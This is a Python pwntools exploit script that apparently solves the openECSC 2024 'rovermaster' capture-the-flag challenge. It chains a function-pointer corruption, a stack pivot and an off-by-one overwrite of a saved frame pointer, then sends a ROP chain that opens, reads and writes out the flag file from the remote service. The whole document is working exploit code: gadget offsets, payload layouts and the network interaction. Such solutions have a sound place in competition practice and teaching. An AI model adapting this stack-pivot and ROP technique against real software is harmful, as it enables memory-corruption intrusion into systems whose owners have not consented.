#!/usr/bin/env python3

import os
os.environ['PWNLIB_NOTERM'] = '1'
from pwn import *

logging.disable()

# For TCP connection
HOST = os.environ.get("HOST", "rovermaster.challs.open.ecsc2024.it")
PORT = int(os.environ.get("PORT", 38007))

context.endianness = 'little'
context.bits = 64

exe = ELF(os.path.join(os.path.dirname(__file__), 'main'))

io = remote(HOST, PORT)

# ======================================================= stack pivot 1 =======================================================
# this is placed in main's stack frame. the function pointer corruption
# will pivot the stack to this frame here.
# this frame calls the read gadget, so that we can read a big rop chain into g_rovers

READ_GADGET = exe.symbols.cmd_set_name + 168
G_ROVERS = exe.symbols.g_rovers
payload = p64(G_ROVERS)             # r31
payload += b"B" * 0x8               # nowhere
payload += b"C" * 0x8               # nowhere
payload += p64(READ_GADGET)         # lr        (where i will jump to)

io.sendlineafter(b"Joke size: ", str(len(payload)).encode())
io.sendlineafter(b"Joke: ", payload)

io.sendlineafter(b"Option:", str(2).encode())                       # Set command
io.sendlineafter(b"Choose the action:", str(1).encode())            # action -> set planet
io.sendlineafter(b"Option:", str(3).encode())                       # Execute command
io.sendlineafter(b"Send new planet size: ", str(0x100).encode())

# ======================================================= BIG ROP CHAIN =======================================================     # we need to know the length of this ropchain to call read_exactly

PARAMS_SHIFT = 0x200
STACK_PADDING = 0x30
STACK_SHIFT = (-0xac0 + STACK_PADDING + PARAMS_SHIFT) % 2**64 

# ===================== 1 ===================== - read -> coolg
LR_OFFSET = 0x90
COOL_GADGET =  exe.sym._Unwind_Resume + 380
stack1 = b"flag\x00"
stack1 += b"D" * (LR_OFFSET - len(stack1) - 0x8 * 3)
stack1 += p64(STACK_SHIFT)               # r31              # this is the offset i can use to move the stack at the end of COOL_GAGDET
stack1 += p64(0x0)                                          # <---- when i jump to COOL_GADGET the stack is here
stack1 += p64(0x0)
stack1 += p64(COOL_GADGET)               # lr

# ===================== 2 ===================== - open -> coolg

R31_OFFSET = 0x10 + PARAMS_SHIFT
stack2 = b""
stack2 += b"E" * R31_OFFSET
stack2 += p64(STACK_SHIFT)              # r31
stack2 += p64(0x0)
stack2 += p64(0x0)
stack2 += p64(COOL_GADGET)              # lr

# ===================== 3 ===================== - read -> coolg

R31_OFFSET = 0x10 + PARAMS_SHIFT
stack3 = b""
stack3 += b"F" * R31_OFFSET
stack3 += p64(STACK_SHIFT)              # r31
stack3 += p64(0x0)
stack3 += p64(0x0)
stack3 += p64(COOL_GADGET)              # lr

# ===================== 4 ===================== - write -> exit

# we don't need anything here cause we don't care what the program does after write
EXIT = exe.sym.exit
R31_OFFSET = 0x10 + PARAMS_SHIFT
stack4 = b""
stack4 += b"F" * R31_OFFSET
stack4 += p64(STACK_SHIFT)              # r31
stack4 += p64(0x0)
stack4 += p64(0x0)
stack4 += p64(EXIT)                     # lr

# ============== params for open =============

FRAME2_R3_OFFSET = 0x8a8
FRAME2_R0_OFFSET = 0x1f8
OPEN =  exe.sym.open64 + 20

params = b"X" * (FRAME2_R3_OFFSET - len(stack2) - len(stack3) - len(stack4))
params += p64(G_ROVERS)                  # r3
params += p64(0x0)                       # r4
params += p64(0x1a4)                     # r5
params += b"X" * FRAME2_R0_OFFSET
params += p64(OPEN)                      # r0 (next call)

# ============== params for read =============

FRAME4_R3_OFFSET = 0x18
FRAME4_R0_OFFSET = 0x1f8
READ = exe.sym.read + 20
FD = int(args.FD if args.FD else 3)

params += b"Y" * FRAME4_R3_OFFSET
params += p64(FD)                        # r3
params += p64(G_ROVERS)                  # r4            -> the flag will be read here
params += p64(0x100)                     # r5            -> read 0x100 bytes
params += b"X" * FRAME4_R0_OFFSET
params += p64(READ)                      # r0 (next call)

# ============== params for write =============

FRAME6_R3_OFFSET = 0x18
FRAME6_R0_OFFSET = 0x1f8
WRITE =  exe.sym.write + 20

params += b"Z" * FRAME6_R3_OFFSET
params += p64(1)                         # r3
params += p64(G_ROVERS)                  # r4            -> the flag will be read here
params += p64(0x100)                     # r5            -> write 0x100 bytes
params += b"Z" * FRAME6_R0_OFFSET
params += p64(WRITE)                     # r0 (next call)

stack = stack1 + stack2 + stack3 + stack4 + params

# ======================================================== read gadget ========================================================
ROP_READ_LEN = len(stack)
payload = b"A" * 0x5a                                               # padding
payload += p64(G_ROVERS - 0x106)                                    # this will be r9 + 0x106
payload += p64((0x61616161 << 32) | (ROP_READ_LEN - 1))             # the lower half will be set to r10. then r10++
payload += b"C" * (0x100 - len(payload) + 1)
io.sendafter(b"New planet: ", payload)

# ======================================================== trigger bug ========================================================
io.sendlineafter(b"Option:", str(2).encode())
io.sendlineafter(b"Choose the action:", str(3).encode())

io.sendlineafter(b"Option:", str(3).encode())                       # Execute command
io.sendlineafter(b"Send new name size: ", str(0x100).encode())
OFF_BY_ONE = (exe.sym.cmd_set_planet + 204) & 0xff                  # this needs to be the LSB of the instr:     addi    r1,r31,160.
io.sendlineafter(b"New name: ", b"D"*0x100 + p8(OFF_BY_ONE))               
io.sendlineafter(b"Option:", str(3).encode())                       # Execute command

# Here we just triggered the controlled length read inside g_rovers. We send the new stack here.
io.send(stack)

if args.ATTACH:
    io.interactive()
else:

    res = io.clean(0.5)

    if b"openECSC{" in res:
        flag = b"openECSC{" + res.split(b"openECSC{")[1].split(b"}")[0] + b"}"
        print(flag.decode())
    else:
        print("flag not found :(")

io.close()
exit()
